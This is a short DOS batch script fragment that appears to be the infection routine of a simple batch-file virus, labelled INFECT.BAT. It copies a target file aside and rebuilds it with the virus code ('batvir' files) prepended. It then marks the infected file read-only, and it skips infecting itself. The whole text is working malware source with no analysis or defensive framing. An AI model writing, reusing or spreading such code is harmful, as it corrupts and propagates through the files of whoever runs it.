if [%1]==[INFECT.BAT] goto fuckit 
del something.tmp 
copy /b %1 something.tmp 
del %1 
copy /b batvir + batvir.bat + something.tmp %1 
del something.tmp 
attrib +r %1 
:fuckit 
